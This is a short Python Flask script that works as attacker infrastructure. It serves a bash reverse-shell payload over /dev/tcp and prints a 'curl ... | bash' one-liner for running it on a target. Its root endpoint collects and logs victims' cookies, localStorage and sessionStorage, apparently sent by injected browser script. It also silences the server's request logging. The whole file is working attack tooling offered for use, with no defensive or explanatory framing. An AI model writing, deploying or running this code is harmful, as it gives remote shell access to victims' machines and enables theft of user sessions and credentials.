#!/usr/bin/env python3
from flask import Flask,Response,request
import sys
import logging
log=logging.getLogger('werkzeug')
log.disabled=True
cli=sys.modules['flask.cli']
cli.show_server_banner=lambda*x:None
a=Flask(__name__)
print("""
Simply start a reverse shell now!
curl+http://<address>/rev/443|bash
""")
@a.route('/rev/<int:p>')
def r(p):
 ip=request.host.split(':')[0]if':'in request.host else request.host
 payload=f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'
 return Response(payload,mimetype='text/plain')
@a.route('/',methods=['GET','POST'])
def h():
 d=request.args.get('c')or request.get_data(as_text=True)or''
 if d:
  p=d.split(',')
  print('----------------------------------------------------')
  print('\033[92mConnected\033[0m')
  print('Host: '+request.remote_addr)
  print('User-Agent: '+request.headers.get('User-Agent',''))
  print('Cookies: '+(p[0]if len(p)>0 else''))
  print('localStorage: '+(p[1]if len(p)>1 else''))
  print('sessionStorage: '+(p[2]if len(p)>2 else''))
  print('----------------------------------------------------')
  print()
 return'',204
if __name__=="__main__":
 a.run(host='0.0.0.0',port=80,debug=False)
